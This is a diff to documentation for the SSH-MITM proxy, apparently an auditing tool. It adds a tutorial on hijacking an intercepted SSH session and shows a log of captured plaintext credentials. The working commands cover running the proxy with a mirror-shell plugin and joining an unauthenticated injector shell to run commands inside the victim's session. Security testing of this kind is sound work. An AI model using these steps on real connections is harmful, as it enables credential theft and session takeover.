@@ -38,9 +38,51 @@ You will see the credentials in the log output.
     :linenos:
 
     2021-01-01 11:38:26,098 [INFO]  Client connection established with parameters:
-        Remote Address: 127.0.0.1
+        Remote Address: 192.168.0.x
         Port: 22
         Username: user
         Password: supersecret
         Key: None
         Agent: None
+
+
+Hijack a SSH terminal session
+-----------------------------
+
+Getting the plain text credentials is only half the fun.
+SSH-MITM proxy server is able to hijack a ssh session and allows you to interact with it.
+
+Let's get startet with hijacking the session.
+
+.. code-block:: bash
+    :linenos:
+
+    $ ssh-mitm --remote-host 192.168.0.x --ssh-interface ssh_proxy_server.plugins.ssh.mirrorshell.SSHMirrorForwarder
+
+Connect your ssh client with the ssh-mitm proxy.
+
+.. code-block:: bash
+    :linenos:
+
+    $ ssh -p 10022 user@proxyserver
+
+When a client connects, the ssh-mitm proxy server starts a new server, where you can connect with another ssh client.
+This server is used to hijack the session.
+
+.. code-block:: none
+    :linenos:
+
+    2021-01-01 11:42:43,699 [INFO]  created injector shell on port 34463. connect with: ssh -p 34463 127.0.0.1
+
+To hijack the session, you can use your favorite ssh client. This connection does not require authentication.
+
+.. code-block:: bash
+    :linenos:
+
+    $ ssh -p 34463 127.0.0.1
+
+After you are connected, your session will only be updated with new responses, but you are able to execute commands.
+
+Try to execute somme commands in the hijacked session or in the original session.
+
+The output will be shown in both sessions.
